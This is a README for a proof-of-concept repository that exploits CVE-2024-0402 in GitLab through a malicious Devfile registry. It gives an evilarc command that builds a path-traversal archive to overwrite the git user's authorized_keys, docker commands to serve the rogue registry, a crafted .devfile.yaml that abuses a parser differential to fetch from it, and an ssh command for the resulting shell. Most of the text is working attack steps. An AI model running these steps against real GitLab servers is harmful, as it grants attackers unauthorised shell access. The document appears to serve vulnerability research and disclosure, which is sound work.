# Malicious Devfile Registry

The project contains a malicious Devfile Registry usable to exploit CVE-2024-0402 in Gitlab.

## The Exploit

A `nodejs:2.2.1` stack is indexed to expose the `archive.tar` file exploiting the path-traversal issue in [registry-support library before v1.1.0](https://github.com/devfile/registry-support/commit/10b01bc136bd082f59b1ac0c91797f4065792d7b).

*tar location*: `malicious-devfile-registry/stacks/nodejs/2.2.1/archive.tar`

It was created using the [evilarc.py](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py) to overwrite the `/var/opt/gitlab/.ssh/authorized_keys` in the target Gitlab Server with the SSH keys under `ssh-keys/` folder in this repo.

```bash
python3 evilarc.py authorized_keys -f authzkeys.tar.gz -p var/opt/gitlab/.ssh/ -o unix
```

Once running, the registry will have the malicious *.tar* added to the fetchable stacks.
See the `index.json` listing it among the stack resources:
```
...
"links": {
          "self": "devfile-catalog/nodejs:2.2.1"
        },
        ...
        "resources": [
          "devfile.yaml",
          "archive.tar"
        ],
...
```

## Reproduction Steps

Configure a Gitlab Instance EE with version <=16.8.0. Enable Workspaces on it following the docs and the extra notes in our dedicated [!exploitable series blogpost](https://blog.doyensec.com/2025/03/18/exploitable-gitlab.html). 

Whenever ready, follow the steps below:

1. Run `docker build -t devfile-index .` in the root of this repo to build the registry container image

2. Run `docker run -d -p 5000:5000 --name local-registrypoc registry:2` to run a local container registry that will be used by the Devfile registry to store the stack. **Note:** you should edit the command to expose it according to your need. For us, it was all happening in a local environment

3. Run `docker run --network host devfile-index` to start the malicious Devfile registry built at step one. **Note:** Like before, edit the run command as you wish to make it reachable by the Gitlab instance

4. Authenticate as developer to the target Gitlab server, then edit the `.devfile.yaml` of a repository you control. The YAML must exploit the parser differential to allow fetching from the malicious registry

```yaml
schemaVersion: 2.2.0
!binary parent:
    id: nodejs
    registryUrl: http://<YOUR_MALICIOUS_REGISTRY>:<PORT>
components:
  - name: development-environment
    attributes:
      gl/inject-editor: true
    container:
      image: "registry.gitlab.com/gitlab-org/gitlab-build-images/workspaces/ubuntu-24.04:20250109224147-golang-1.23@sha256:c3d5527641bc0c6f4fbbea4bb36fe225b8e9f1df69f682c927941327312bc676"
```

5. To trigger the file-write in the Gitlab UI, just start a new Workspace in the edited repo.
After few seconds, the arbitrary file write should happen and the `ssh-keys/pockey.pub` will be added to the `authorized_keys` of the `git` user

6. You should be able to enjoy an unrestricted shell as `git` with
```bash
ssh  -i ssh-keys/pockey git@<YOUR_GITLAB_SERVER>
```
